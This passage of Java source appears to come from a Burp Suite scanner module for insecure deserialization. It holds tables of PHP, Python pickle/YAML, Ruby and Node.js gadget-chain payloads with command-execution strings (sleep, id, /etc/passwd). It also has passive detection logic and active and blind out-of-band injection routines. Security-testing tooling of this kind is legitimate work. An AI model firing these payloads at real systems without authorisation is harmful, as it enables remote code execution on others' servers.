            {"Drupal RCE", "O:28:\"Drupal\\Core\\Entity\\Entity\":1:{s:12:\"\\0*\\0entityType\";s:4:\"node\";}"},
            {"PHPUnit mock", "O:32:\"PHPUnit\\Framework\\MockObject\\Mock\":1:{s:10:\"invocation\";O:32:\"PHPUnit\\Framework\\MockObject\\Rule\":1:{s:4:\"rule\";s:6:\"system\";}}"},
            {"Slim RCE", "O:18:\"Slim\\Http\\Response\":1:{s:4:\"body\";O:15:\"Slim\\Http\\Body\":1:{s:6:\"stream\";O:33:\"GuzzleHttp\\Psr7\\FnStream\":0:{}}}"},
            {"CodeIgniter4 RCE", "O:44:\"CodeIgniter\\Cache\\Handlers\\FileHandler\":1:{s:8:\"\\0*\\0path\";s:11:\"/etc/passwd\";}"},
            {"ThinkPHP RCE", "O:27:\"think\\process\\pipes\\Windows\":1:{s:34:\"\\0think\\process\\pipes\\Windows\\0files\";a:1:{i:0;O:17:\"think\\model\\Pivot\":0:{};}}"},
    };

    // Python pickle payloads
    private static final String[][] PYTHON_PAYLOADS = {
            {"Pickle exec", "gASVIAAAAAAAAACMBXBvc2l4lIwGc3lzdGVtlJOUjAVzbGVlcJSFlFKULg=="},
            {"Pickle import", "Y29zCnN5c3RlbQooUydzbGVlcCA1Jwp0Ui4="},
            {"Pickle subprocess", "gASVLQAAAAAAAACMCnN1YnByb2Nlc3OUjAVjaGVja19vdXRwdXSUk5SMBXNsZWVwlIWUUpQu"},
            {"YAML unsafe load", "ISFweXRob24vb2JqZWN0L2FwcGx5Om9zLnN5c3RlbQotIHNsZWVwIDU="},
            {"Pickle os.popen", "gASVKQAAAAAAAACMAnBvc2l4lIwGc3lzdGVtlJOUjA5zbGVlcCA1IDI+L3SFlFKULg=="},
            {"Pickle subprocess.call", "gASVMwAAAAAAAACMCnN1YnByb2Nlc3OUjARjYWxslJOUXZQojAVzbGVlcJSMATWUZYWUUpQu"},
            {"Pickle builtins.eval", "gASVJAAAAAAAAACMCGJ1aWx0aW5zlIwEZXZhbJSTlIwNX19pbXBvcnRfXygpkZRSlC4="},
            {"YAML !!python/object", "ISFweXRob24vb2JqZWN0L25ldzpvcy5zeXN0ZW0gW3NsZWVwIDVd"},
            {"Pickle reduce tuple", "Y3Bvc2l4CnN5c3RlbQpwMAooUydzbGVlcCA1JwpwMQp0cDIKUnAzCi4="},
            {"Pickle2 os.system", "gAJjcG9zaXgKc3lzdGVtCnEAWAcAAABzbGVlcCA1cQGFcQJScQMu"},
            {"Jsonpickle RCE", "eyJweS9yZWR1Y2UiOiBbeyJweS9mdW5jdGlvbiI6ICJvcy5zeXN0ZW0ifSwgeyJweS90dXBsZSI6IFsic2xlZXAgNSJdfV19"},
            {"PyYAML RCE", "ISFweXRob24vb2JqZWN0L2FwcGx5OnN1YnByb2Nlc3MuUG9wZW4KLSBzbGVlcCA1"},
    };

    // Ruby deserialization payloads (Marshal.load / YAML.load gadget chains)
    private static final String[][] RUBY_PAYLOADS = {
            // Marshal.load payloads (Base64 encoded)
            {"Ruby ERB template",
                    "BAhvOhVHZW06OlJlcXVpcmVtZW50WwZvOhhHZW06OkRlcGVuZGVuY3lMaXN0BzoLQHNwZWNz"
                            + "WwdvOhpHZW06OlN0dWJTcGVjaWZpY2F0aW9uBjoJQG5hbWUiCXNsZWVw"},
            {"Ruby Universal RCE chain",
                    "BAhbCGMVR2VtOjpJbnN0YWxsZXJVOhVHZW06OlJlcXVpcmVtZW50WwZvOhhHZW06OkRl"
                            + "cGVuZGVuY3lMaXN0BzoLQHNwZWNzWwA="},
            {"Ruby Gem::Installer",
                    "BAhvOhVHZW06Okluc3RhbGxlcgY6CUBnZW1vOhpHZW06OlN0dWJTcGVjaWZpY2F0aW9u"},
            {"Ruby Gem::Requirement",
                    "BAhVOhVHZW06OlJlcXVpcmVtZW50WwZvOhhHZW06OkRlcGVuZGVuY3lMaXN0"},
            // YAML-based payloads
            {"Ruby YAML Gem::Installer",
                    "LS0tICFydWJ5L29iamVjdDpHZW06Okluc3RhbGxlcgppOiAhcnVieS9vYmplY3Q6R2VtOjpT"
                            + "cGVjRmV0Y2hlcgppOiAhcnVieS9vYmplY3Q6R2VtOjpSZXF1aXJlbWVudA=="},
            {"Ruby YAML ERB",
                    "LS0tICFydWJ5L29iamVjdDpFcmI6OlV0aWw6OkNhcHR1cmUKc3JjOiAiPCU9IHN5c3RlbSgn"
                            + "c2xlZXAgNScpICU+Ig=="},
            {"Ruby YAML Psych",
                    "LS0tICFydWJ5L29iamVjdDpHZW06Okluc3RhbGxlcgppOiAhcnVieS9vYmplY3Q6R2VtOjpT"
                            + "dHViU3BlY2lmaWNhdGlvbgoJbmFtZTogc2xlZXA="},
    };

    // Node.js deserialization payloads
    private static final String[][] NODEJS_PAYLOADS = {
            // node-serialize IIFE payloads
            {"node-serialize IIFE",
                    "{\"rce\":\"_$$ND_FUNC$$_function(){require('child_process').execSync('sleep 18')}()\"}"},
            {"node-serialize require",
                    "{\"rce\":\"_$$ND_FUNC$$_function(){var net=require('net');var cp=require('child_process')}()\"}"},
            // cryo deserialization
            {"cryo prototype pollution",
                    "{\"__cryo_type__\":\"Function\",\"body\":\"return require('child_process').execSync('sleep 18')\"}"},
            // funcster deserialization
            {"funcster RCE",
                    "{\"__js_function\":\"function(){require('child_process').execSync('sleep 18')}\"}"},
            // js-yaml !!js/function
            {"js-yaml function",
                    "!!js/function 'function(){require(\"child_process\").execSync(\"sleep 18\")}'"},
            // node-serialize with Buffer
            {"node-serialize Buffer",
                    "{\"rce\":\"_$$ND_FUNC$$_function(){Buffer.from(require('child_process').execSync('id'))}()\"}"},
            // Prototype pollution leading to RCE
            {"constructor.prototype",
                    "{\"__proto__\":{\"type\":\"Code\",\"value\":\"require('child_process').execSync('sleep 18')\"}}"},
            {"constructor pollution",
                    "{\"constructor\":{\"prototype\":{\"outputFunctionName\":\"x;require('child_process').execSync('sleep 18');x\"}}}"},
    };

    // Additional PHP framework chains
    private static final String[][] PHP_FRAMEWORK_PAYLOADS = {
            // Joomla chain
            {"Joomla RCE", "O:21:\"JDatabaseDriverMysqli\":3:{s:4:\"\\0\\0\\0a\";O:17:\"JSimplepieFactory\":0:{}s:21:\"\\0\\0\\0disconnectHandlers\";a:1:{i:0;a:2:{i:0;O:9:\"SimplePie\":5:{s:8:\"sanitize\";O:20:\"JDatabaseDriverMysql\":0:{}s:5:\"cache\";b:1;s:19:\"cache_name_function\";s:6:\"assert\";s:10:\"javascript\";i:9999;s:8:\"feed_url\";s:54:\"eval(base64_decode('cGhwaW5mbygpOw=='));JFactory::getConfig();exit\";}i:1;s:4:\"init\";}}s:13:\"\\0\\0\\0connection\";i:1;}"},
            // PrestaShop chain
            {"PrestaShop chain", "O:26:\"Smarty_Internal_Template\":1:{s:5:\"cache\";O:36:\"Smarty_Internal_CacheResource_File\":1:{s:5:\"valid\";b:0;}}"},
            // PHPMailer object injection
            {"PHPMailer RCE", "O:9:\"PHPMailer\":1:{s:17:\"\\0PHPMailer\\0Mailer\";s:8:\"sendmail\";s:13:\"\\0PHPMailer\\0LE\";s:1:\"'\";s:22:\"\\0PHPMailer\\0Sendmail\";s:26:\"/usr/sbin/sendmail -t -i\";}"},
            // Phalcon chain
            {"Phalcon chain", "O:27:\"Phalcon\\Mvc\\Model\\Row\":1:{s:4:\"data\";a:1:{s:2:\"id\";s:11:\"/etc/passwd\";}}"},
            // Zend Framework chain
            {"Zend Framework", "O:30:\"Zend_Log_Writer_Mail\":1:{s:16:\"\\0*\\0_eventsToMail\";a:1:{i:0;s:6:\"system\";}}"},
            // FuelPHP chain
            {"FuelPHP chain", "O:27:\"Fuel\\Core\\Autoloader\":1:{s:8:\"\\0*\\0paths\";a:1:{s:4:\"test\";s:11:\"/etc/passwd\";}}"},
            // phpBB chain
            {"phpBB chain", "O:15:\"phpbb\\db\\driver\":1:{s:11:\"\\0*\\0sql_layer\";s:6:\"system\";}"},
            // Contao chain
            {"Contao chain", "O:29:\"Contao\\CoreBundle\\Routing\":1:{s:4:\"path\";s:11:\"/etc/passwd\";}"},
            // SugarCRM chain
            {"SugarCRM chain", "O:28:\"SugarBean\\Person\\Employee\":1:{s:8:\"\\0*\\0table\";s:6:\"system\";}"},
            // MediaWiki chain
            {"MediaWiki chain", "O:12:\"ArrayObject\":1:{i:0;O:12:\"MWException\":1:{s:4:\"text\";s:4:\"test\";}}"},
            // TCPDF chain
            {"TCPDF chain", "O:5:\"TCPDF\":1:{s:8:\"\\0*\\0file\";s:11:\"/etc/passwd\";}"},
    };

    public static class DeserPoint {
        public final String location; // cookie, header, param, body
        public final String name;
        public final String value;
        public final String language; // Java, .NET, PHP, Python
        public final String indicator; // what triggered detection
        public final String encoding; // "none", "base64", "base64url", "json+base64" — tells active testing how to wrap payloads
        public final String jsonKey; // JSON field name containing serialized data, or null

        public DeserPoint(String location, String name, String value, String language, String indicator) {
            this(location, name, value, language, indicator, "none", null);
        }

        public DeserPoint(String location, String name, String value, String language,
                           String indicator, String encoding) {
            this(location, name, value, language, indicator, encoding, null);
        }

        public DeserPoint(String location, String name, String value, String language,
                           String indicator, String encoding, String jsonKey) {
            this.location = location;
            this.name = name;
            this.value = value;
            this.language = language;
            this.indicator = indicator;
            this.encoding = encoding;
            this.jsonKey = jsonKey;
        }
    }

    @Override
    public String getId() { return "deser-scanner"; }

    @Override
    public String getName() { return "Deserialization Scanner"; }

    @Override
    public String getDescription() {
        return "Insecure deserialization detection for Java (core, Fastjson, Jackson, XStream, SnakeYAML, Kryo, Hessian), "
                + ".NET (BinaryFormatter, JSON.NET, ViewState, XAML, SOAP), PHP (Laravel, Symfony, WordPress, Magento, Yii2, "
                + "Joomla, Drupal, CakePHP, ThinkPHP, CodeIgniter, Monolog, Guzzle), Python (pickle, PyYAML, jsonpickle), "
                + "Ruby (Marshal, YAML/Psych), and Node.js (node-serialize, cryo, funcster, js-yaml). "
                + "Scans headers, cookies, parameters, and raw body — both raw and base64-encoded.";
    }

    @Override
    public ModuleCategory getCategory() { return ModuleCategory.INJECTION; }

    @Override
    public boolean isPassive() { return false; }

    @Override
    public void initialize(MontoyaApi api, ModuleConfig config) {
        this.api = api;
        this.config = config;
    }

    public void setDependencies(DeduplicationStore dedup, FindingsStore findingsStore,
                                 CollaboratorManager collaboratorManager) {
        this.dedup = dedup;
        this.findingsStore = findingsStore;
        this.collaboratorManager = collaboratorManager;
    }

    @Override
    public List<Finding> processHttpFlowForParameter(
            HttpRequestResponse requestResponse, String targetParameterName, MontoyaApi api) {
        HttpRequest request = requestResponse.request();
        String url = request.url();
        String urlPath = extractPath(url);

        // Run passive analysis to identify deserialization points, then filter to target parameter
        List<DeserPoint> deserPoints = new ArrayList<>();
        List<Finding> findings = new ArrayList<>();
        passiveAnalyzeRequest(request, url, deserPoints, findings);
        deserPoints.removeIf(dp -> !dp.name.equalsIgnoreCase(targetParameterName));

        // Flush passive findings to FindingsStore IMMEDIATELY so the UI shows
        // detection results BEFORE any active payloads are sent.
        for (Finding f : findings) {
            Finding flushed = f.getRequestResponse() != null ? f :
                    Finding.builder(f.getModuleId(), f.getTitle(), f.getSeverity(), f.getConfidence())
                            .url(f.getUrl()).parameter(f.getParameter())
                            .evidence(f.getEvidence()).description(f.getDescription())
                            .remediation(f.getRemediation())
                            .payload(f.getPayload()).responseEvidence(f.getResponseEvidence())
                            .requestResponse(requestResponse)
                            .build();
            findingsStore.addFinding(flushed);
        }

        for (DeserPoint dp : deserPoints) {
            String dedupParam = dp.name + ":" + dp.language;
            if (!dedup.markIfNew("deser-scanner", urlPath, dedupParam)) continue;
            try {
                activeTest(requestResponse, dp);
            } catch (Exception e) {
                api.logging().logToError("Deser active test error: " + e.getMessage());
            }
        }

        // Blind OOB spray if passive found nothing — but only for the target parameter
        if (deserPoints.isEmpty()) {
            try {
                blindOobSprayForParameter(requestResponse, urlPath, targetParameterName);
            } catch (Exception e) {
                api.logging().logToError("Deser blind OOB spray error: " + e.getMessage());
            }
        }

        // Return passive findings (e.g., ".NET BinaryFormatter detected") so the caller
        // adds them to FindingsStore. Previously returned emptyList(), discarding all passive findings.
        List<Finding> enriched = new ArrayList<>(findings.size());
        for (Finding f : findings) {
            if (f.getRequestResponse() == null) {
                enriched.add(Finding.builder(f.getModuleId(), f.getTitle(), f.getSeverity(), f.getConfidence())
                        .url(f.getUrl()).parameter(f.getParameter())
                        .evidence(f.getEvidence()).description(f.getDescription())
                        .remediation(f.getRemediation())
                        .payload(f.getPayload()).responseEvidence(f.getResponseEvidence())
                        .requestResponse(requestResponse)
                        .build());
            } else {
                enriched.add(f);
            }
        }
        return enriched;
    }

    @Override
    public List<Finding> processHttpFlow(HttpRequestResponse requestResponse, MontoyaApi api) {
        List<Finding> findings = new ArrayList<>();
        HttpRequest request = requestResponse.request();
        HttpResponse response = requestResponse.response();
        String url = request.url();
        String urlPath = extractPath(url);

        // ==================== PASSIVE ANALYSIS ====================

        // Analyze request for serialized data
        List<DeserPoint> deserPoints = new ArrayList<>();
        passiveAnalyzeRequest(request, url, deserPoints, findings);

        // Analyze response for serialization indicators
        if (response != null) {
            passiveAnalyzeResponse(response, url, findings);
        }

        // Flush passive findings to FindingsStore IMMEDIATELY so the UI shows
        // detection results (e.g., ".NET BinaryFormatter detected") BEFORE any
        // active payloads are sent. FindingsStore has dedup, so returning them
        // again at the end won't cause duplicates.
        for (Finding f : findings) {
            Finding flushed = f.getRequestResponse() != null ? f :
                    Finding.builder(f.getModuleId(), f.getTitle(), f.getSeverity(), f.getConfidence())
                            .url(f.getUrl()).parameter(f.getParameter())
                            .evidence(f.getEvidence()).description(f.getDescription())
                            .remediation(f.getRemediation())
                            .payload(f.getPayload()).responseEvidence(f.getResponseEvidence())
                            .requestResponse(requestResponse)
                            .build();
            findingsStore.addFinding(flushed);
        }

        // ==================== ACTIVE TESTING ====================
        // Test each identified serialization point
        for (DeserPoint dp : deserPoints) {
            String dedupParam = dp.name + ":" + dp.language;
            if (!dedup.markIfNew("deser-scanner", urlPath, dedupParam)) continue;

            try {
                activeTest(requestResponse, dp);
            } catch (Exception e) {
                api.logging().logToError("Deser active test error: " + e.getMessage());
            }
        }

        // If passive detection found NO deserialization points, blind-spray OOB
        // payloads into all cookies and body parameters for every language.
        if (deserPoints.isEmpty()) {
            try {
                blindOobSpray(requestResponse, urlPath);
            } catch (Exception e) {
                api.logging().logToError("Deser blind OOB spray error: " + e.getMessage());
            }
        }

        // Attach requestResponse to all passive findings so DashboardReporter
        // can report them (it skips findings with null requestResponse).
        List<Finding> enriched = new ArrayList<>(findings.size());
        for (Finding f : findings) {
            if (f.getRequestResponse() == null) {
                enriched.add(Finding.builder(f.getModuleId(), f.getTitle(), f.getSeverity(), f.getConfidence())
                        .url(f.getUrl()).parameter(f.getParameter())
                        .evidence(f.getEvidence()).description(f.getDescription())
                        .remediation(f.getRemediation())
                        .payload(f.getPayload()).responseEvidence(f.getResponseEvidence())
                        .requestResponse(requestResponse)
                        .build());
            } else {
                enriched.add(f);
            }
        }
        return enriched;
    }

    // ==================== PASSIVE: REQUEST ANALYSIS ====================

    private void passiveAnalyzeRequest(HttpRequest request, String url,
                                        List<DeserPoint> deserPoints, List<Finding> findings) {
        // Check cookies — scan raw, URL-decoded, and base64-decoded with dedup
        for (var param : request.parameters()) {
            if (param.type() == burp.api.montoya.http.message.params.HttpParameterType.COOKIE) {
                String name = param.name().toLowerCase();
                String value = param.value();

                // Apache Shiro rememberMe — special-case (always a known target)
                if (name.equals("rememberme") || name.equals("remember-me")) {
                    deserPoints.add(new DeserPoint("cookie", param.name(), value, "Java", "Shiro rememberMe cookie"));
                    findings.add(Finding.builder("deser-scanner",
                                    "Shiro rememberMe cookie detected",
                                    Severity.INFO, Confidence.FIRM)
                            .url(url).parameter(param.name())
                            .evidence("Cookie: " + param.name() + "=" + value.substring(0, Math.min(50, value.length())) + "...")
                            .description("Apache Shiro rememberMe cookie found. This is a known deserialization target. "
                                    + "Vulnerable versions allow RCE via crafted serialized objects.")
                            .responseEvidence(param.name() + "=" + value.substring(0, Math.min(50, value.length())))
                            .build());
                }

                // .NET session cookies — special-case info finding
                if (DOTNET_SESSION_COOKIE.matcher(name).find()) {
                    deserPoints.add(new DeserPoint("cookie", param.name(), value, ".NET", ".NET session cookie"));
                    findings.add(Finding.builder("deser-scanner",
                                    ".NET session cookie detected: " + param.name(),
                                    Severity.LOW, Confidence.FIRM)
                            .url(url).parameter(param.name())
                            .evidence("Cookie: " + param.name() + " (length=" + value.length() + ")")
                            .description(".NET session/auth cookie found. If this cookie contains serialized data "
                                    + "(e.g., claims, tokens), it may be a deserialization target.")
                            .responseEvidence(param.name())
                            .build());
                }

                // All-language pattern scan: raw → URL-decoded → base64-decoded (with dedup)
                deserPoints.addAll(scanValueAllEncodings(value, "cookie", param.name(), url, findings));
            }
        }

        // Check body parameters and POST body
        for (var param : request.parameters()) {
            if (param.type() == burp.api.montoya.http.message.params.HttpParameterType.BODY) {
                checkParamValue(param.name(), param.value(), "body_param", url, deserPoints, findings);
            }
            if (param.type() == burp.api.montoya.http.message.params.HttpParameterType.URL) {
                checkParamValue(param.name(), param.value(), "url_param", url, deserPoints, findings);
            }
        }

        // Check request headers — all languages, URL-decoded + base64 decoded (with dedup)
        for (var header : request.headers()) {
            String hname = header.name().toLowerCase();
            String value = header.value();

            // Skip standard browser headers that never contain serialized data
            if (hname.equals("host") || hname.equals("user-agent") || hname.equals("accept")
                    || hname.equals("accept-encoding") || hname.equals("accept-language")
                    || hname.equals("connection") || hname.equals("content-type")
                    || hname.equals("content-length") || hname.equals("referer")
                    || hname.equals("origin") || hname.equals("if-modified-since")
                    || hname.equals("if-none-match") || hname.equals("cache-control")
                    || hname.startsWith("sec-fetch-") || hname.startsWith("sec-ch-")) continue;

            if (value == null || value.isEmpty()) continue;

            // All-language pattern scan: raw → URL-decoded → base64-decoded (with dedup)
            deserPoints.addAll(scanValueAllEncodings(value, "header", header.name(), url, findings));
        }

        // Check raw body for .NET ViewState
        try {
            String body = request.bodyToString();
            if (body != null) {
                Matcher vsm = DOTNET_VIEWSTATE.matcher(body);
                if (vsm.find()) {
                    String viewstate = vsm.group(1);
                    deserPoints.add(new DeserPoint("body", "__VIEWSTATE", viewstate, ".NET", "ViewState token"));
                    findings.add(Finding.builder("deser-scanner",
                                    ".NET ViewState detected",
                                    Severity.LOW, Confidence.CERTAIN)
                            .url(url).parameter("__VIEWSTATE")
                            .evidence("ViewState: " + viewstate.substring(0, Math.min(80, viewstate.length())) + "...")
                            .description("ASP.NET ViewState found. Check if MAC validation is enabled. "
                                    + "Without MAC validation, this is exploitable for deserialization attacks.")
                            .responseEvidence("__VIEWSTATE")
                            .build());
                }
            }
        } catch (Exception ignored) {}

        // ==================== RAW BODY SCANNING (all languages, raw + URL-decoded + base64) ====================
        try {
            String body = request.bodyToString();
            if (body != null && body.length() > 2) {
                // All-language pattern scan: raw → URL-decoded → base64-decoded (with dedup)
                deserPoints.addAll(scanValueAllEncodings(body, "body", "__BODY__", url, findings));
            }
        } catch (Exception ignored) {}
    }

    /**
     * Checks a parameter value for deserialization patterns across all languages.
     * Uses scanValueAllEncodings to check raw, URL-decoded, and base64-decoded forms
     * with built-in deduplication (one finding per language per encoding).
     */
    private void checkParamValue(String name, String value, String location, String url,
                                  List<DeserPoint> deserPoints, List<Finding> findings) {
        if (value == null || value.isEmpty()) return;
        deserPoints.addAll(scanValueAllEncodings(value, location, name, url, findings));
    }

    // ==================== PASSIVE: RESPONSE ANALYSIS ====================

    private void passiveAnalyzeResponse(HttpResponse response, String url, List<Finding> findings) {
        String body;
        try {
            body = response.bodyToString();
        } catch (Exception e) {
            return;
        }
        if (body == null) return;

        // Check for vulnerable Java library references in response
        String bodyLower = body.toLowerCase();
        for (String lib : JAVA_VULN_LIBRARIES) {
            if (bodyLower.contains(lib)) {
                findings.add(Finding.builder("deser-scanner",
                                "Vulnerable Java library reference: " + lib,
                                Severity.INFO, Confidence.TENTATIVE)
                        .url(url)
                        .evidence("Library '" + lib + "' referenced in response body")
                        .description("Reference to '" + lib + "' found in response. "
                                + "If this library is used for deserialization, it may be exploitable.")
                        .responseEvidence(lib)
                        .build());
                break; // One finding for library references is enough
            }
        }

        // .NET TypeNameHandling — skip if the page looks like documentation (contains code examples)
        boolean looksLikeDocPage = bodyLower.contains("<code") || bodyLower.contains("```")
                || bodyLower.contains("msdn.microsoft.com") || bodyLower.contains("docs.microsoft.com")
                || bodyLower.contains("learn.microsoft.com") || bodyLower.contains("stackoverflow.com");
        Matcher tnm = DOTNET_TYPE_NAME_HANDLING.matcher(body);
        if (tnm.find() && !looksLikeDocPage) {
            findings.add(Finding.builder("deser-scanner",
                            ".NET JSON TypeNameHandling detected: " + tnm.group(1),
                            Severity.HIGH, Confidence.FIRM)
                    .url(url)
                    .evidence("TypeNameHandling=" + tnm.group(1) + " found in response")
                    .description("JSON.NET TypeNameHandling is set to '" + tnm.group(1)
                            + "'. This enables type-based deserialization attacks. "
                            + "Remediation: Use TypeNameHandling.None or implement a SerializationBinder.")
                    .responseEvidence(tnm.group())
                    .build());
        }

        // JSON with $type — confirms JSON.NET polymorphic deserialization is active
        if (DOTNET_DOLLAR_TYPE.matcher(body).find()) {
            findings.add(Finding.builder("deser-scanner",
                            ".NET JSON $type polymorphic deserialization in response",
                            Severity.HIGH, Confidence.FIRM)
                    .url(url)
                    .evidence("$type property found in JSON response body")
                    .description("JSON.NET $type property detected in response. The server uses polymorphic "
                            + "deserialization which allows type injection attacks. "
                            + "Remediation: Remove TypeNameHandling or use a strict SerializationBinder.")
                    .responseEvidence("$type")
                    .build());
        }

        // ViewState MAC disabled
        if (DOTNET_VIEWSTATE_NO_MAC.matcher(body).find()) {
            findings.add(Finding.builder("deser-scanner",
                            ".NET ViewState MAC validation disabled",
                            Severity.HIGH, Confidence.CERTAIN)
                    .url(url)
                    .evidence("enableViewStateMac=false found in response")
                    .description("ViewState MAC validation is disabled. This allows tampering with "
                            + "serialized ViewState data, potentially leading to RCE.")
                    .responseEvidence("enableViewStateMac")
                    .build());
        }

        // ViewStateGenerator — confirms ASP.NET WebForms (deserialization surface)
        if (DOTNET_VIEWSTATE_GENERATOR.matcher(body).find()) {
            Matcher evm = DOTNET_EVENT_VALIDATION.matcher(body);
            boolean hasEventValidation = evm.find();
            findings.add(Finding.builder("deser-scanner",
                            "ASP.NET WebForms with ViewState",
                            Severity.INFO, Confidence.CERTAIN)
                    .url(url)
                    .evidence("__VIEWSTATEGENERATOR found" + (hasEventValidation ? " + __EVENTVALIDATION" : ""))
                    .description("ASP.NET WebForms page detected with ViewState. "
                            + "This creates a deserialization attack surface. "
                            + "Test whether ViewState MAC is properly validated and whether the machine key is default/leaked.")
                    .responseEvidence("__VIEWSTATEGENERATOR")
                    .build());
        }

        // Extended .NET serializer references (XmlSerializer, DataContractSerializer, JavaScriptSerializer)
        Matcher esm = DOTNET_SERIALIZER_EXTENDED.matcher(body);
        if (esm.find()) {
            findings.add(Finding.builder("deser-scanner",
                            ".NET serializer reference: " + esm.group(),
                            Severity.MEDIUM, Confidence.TENTATIVE)
                    .url(url)
                    .evidence("Serializer reference '" + esm.group() + "' found in response")
                    .description("Reference to .NET serializer found. If used with untrusted input, "
                            + "this may enable deserialization attacks. DataContractSerializer and XmlSerializer "
                            + "can be exploited via type injection when used with known type lists.")
                    .responseEvidence(esm.group())
                    .build());
        }

        // .NET Remoting indicators
        if (DOTNET_REMOTING.matcher(body).find()) {
            findings.add(Finding.builder("deser-scanner",
                            ".NET Remoting endpoint detected",
                            Severity.HIGH, Confidence.FIRM)
                    .url(url)
                    .evidence(".NET Remoting pattern found in response")
                    .description(".NET Remoting endpoint detected. Remoting uses BinaryFormatter internally "
                            + "and is inherently vulnerable to deserialization attacks. "
                            + "Remediation: Migrate to WCF or gRPC. .NET Remoting is deprecated.")
                    .responseEvidence(".rem")
                    .build());
        }

        // SOAP envelope (potential .NET SOAP deserialization)
        if (DOTNET_SOAP_ENVELOPE.matcher(body).find()) {
            findings.add(Finding.builder("deser-scanner",
                            "SOAP endpoint detected (potential deserialization surface)",
                            Severity.MEDIUM, Confidence.FIRM)
                    .url(url)
                    .evidence("SOAP envelope found in response")
                    .description("SOAP endpoint detected. .NET SOAP services may use SoapFormatter "
                            + "or DataContractSerializer internally. Test for XXE and type injection.")
                    .responseEvidence("SOAP-ENV:Envelope")
                    .build());
        }

        // ASMX/WCF endpoint
        if (DOTNET_ASMX_WCF.matcher(body).find()) {
            findings.add(Finding.builder("deser-scanner",
                            ".NET ASMX/WCF service endpoint detected",
                            Severity.INFO, Confidence.FIRM)
                    .url(url)
                    .evidence("ASMX/WCF pattern found in response")
                    .description("ASP.NET ASMX or WCF service detected. These services use XML/SOAP "
                            + "serialization and may be vulnerable to XXE or type injection attacks.")
                    .responseEvidence(".asmx")
                    .build());
        }

        // Check response headers for serialization content types
        for (var header : response.headers()) {
            if (header.name().equalsIgnoreCase("Content-Type")) {
                if (JAVA_CONTENT_TYPE.matcher(header.value()).find()) {
                    findings.add(Finding.builder("deser-scanner",
                                    "Java serialization content type in response",
                                    Severity.MEDIUM, Confidence.CERTAIN)
                            .url(url)
                            .evidence("Content-Type: " + header.value())
                            .description("Response uses Java serialization content type. "
                                    + "The application uses Java serialization for data exchange.")
                            .responseEvidence(header.value())
                            .build());
                }
            }
            // .NET BinaryFormatter indicators
            if (DOTNET_BINARY_FORMATTER.matcher(header.value()).find()) {
                findings.add(Finding.builder("deser-scanner",
                                ".NET BinaryFormatter reference in header",
                                Severity.MEDIUM, Confidence.FIRM)
                        .url(url)
                        .evidence("Header: " + header.name() + ": " + header.value())
                        .description("BinaryFormatter or similar .NET serializer detected. "
                                + "These are inherently unsafe and should not be used with untrusted data.")
                        .responseEvidence(header.value())
                        .build());
            }
        }

        // Java Fastjson @type in response — but NOT JSON-LD @type (schema.org)
        // JSON-LD uses @type for semantic web markup (e.g., "@type": "Person", "@type": "WebPage")
        // Fastjson uses @type for Java class paths (e.g., "@type": "com.sun.rowset.JdbcRowSetImpl")
        if (JAVA_FASTJSON_TYPE.matcher(body).find()
                && !body.contains("@context")         // JSON-LD always has @context
                && !body.contains("schema.org")        // schema.org structured data
                && !body.contains("\"@graph\"")        // JSON-LD graph
                && body.matches("(?s).*\"@type\"\\s*:\\s*\"[a-z]+\\..*")) {  // Require Java package path (lowercase.dot.notation)
            findings.add(Finding.builder("deser-scanner",
                            "Fastjson @type polymorphic deserialization in response",
                            Severity.HIGH, Confidence.FIRM)
                    .url(url)
                    .evidence("@type property with Java class path found in JSON response body")
                    .description("Fastjson @type property detected in response with a Java class path value. "
                            + "The server uses Fastjson with AutoType which allows type injection attacks. "
                            + "Remediation: Upgrade Fastjson to latest version with safeMode or migrate to Gson/Jackson.")
                    .responseEvidence("@type")
                    .build());
        }

        // Java Jackson DefaultTyping in response
        if (JAVA_JACKSON_POLY.matcher(body).find()) {
            findings.add(Finding.builder("deser-scanner",
                            "Jackson polymorphic deserialization in response",
                            Severity.HIGH, Confidence.FIRM)
                    .url(url)
                    .evidence("Jackson polymorphic array pattern found in JSON response")
                    .description("Jackson DefaultTyping pattern detected in response. The server uses Jackson "
                            + "with polymorphic type handling which allows type injection attacks. "
                            + "Remediation: Disable DefaultTyping or use a strict PolymorphicTypeValidator.")
                    .responseEvidence("DefaultTyping")
                    .build());
        }

        // Java XStream XML in response
        if (JAVA_XSTREAM_XML.matcher(body).find()) {
            findings.add(Finding.builder("deser-scanner",
                            "XStream XML serialization in response",
                            Severity.MEDIUM, Confidence.FIRM)
                    .url(url)
                    .evidence("XStream XML serialization tags in response body")
                    .description("XStream XML serialization detected in response. Older XStream versions "
                            + "allow RCE via crafted XML. Remediation: Upgrade XStream and configure security framework.")
                    .responseEvidence("XStream")
                    .build());
        }

        // Ruby Marshal/YAML indicators in response
        for (String gem : RUBY_VULN_GEMS) {
            if (bodyLower.contains(gem)) {
                findings.add(Finding.builder("deser-scanner",
                                "Ruby serialization library reference: " + gem,
                                Severity.INFO, Confidence.TENTATIVE)
                        .url(url)
                        .evidence("Ruby library '" + gem + "' referenced in response body")
                        .description("Reference to Ruby library '" + gem + "' found. "
                                + "If this library handles deserialization of untrusted data, it may be exploitable.")
                        .responseEvidence(gem)
                        .build());
                break;
            }
        }
        if (RUBY_YAML_UNSAFE.matcher(body).find()) {
            findings.add(Finding.builder("deser-scanner",
                            "Ruby YAML unsafe object tags in response",
                            Severity.HIGH, Confidence.FIRM)
                    .url(url)
                    .evidence("!!ruby/object or similar YAML tag in response")
                    .description("Ruby YAML object tags found in response. If YAML.load is used to deserialize "
                            + "user-controlled data, this is exploitable for RCE. Use YAML.safe_load instead.")
                    .responseEvidence("!!ruby/object")
                    .build());
        }

        // Node.js serialization indicators in response
        if (NODE_SERIALIZE.matcher(body).find() || NODE_CRYO.matcher(body).find()
                || NODE_FUNCSTER.matcher(body).find()) {
            findings.add(Finding.builder("deser-scanner",
                            "Node.js serialization markers in response",
                            Severity.HIGH, Confidence.FIRM)
                    .url(url)
                    .evidence("Node.js serialization marker found in response body")
                    .description("Node.js serialization library markers detected in response. "
                            + "node-serialize and cryo are known to be vulnerable to RCE via crafted input. "
                            + "Remediation: Replace with JSON.parse/JSON.stringify.")
                    .responseEvidence("_$$ND_FUNC$$_")
                    .build());
        }

        // Python jsonpickle in response
        if (PYTHON_JSONPICKLE.matcher(body).find()) {
            findings.add(Finding.builder("deser-scanner",
                            "Python jsonpickle markers in response",
                            Severity.HIGH, Confidence.FIRM)
                    .url(url)
                    .evidence("jsonpickle markers (py/reduce, py/object) found in response")
                    .description("Python jsonpickle output detected in response. If jsonpickle.decode() is used "
                            + "on user-controlled input, this leads to RCE. Use JSON instead.")
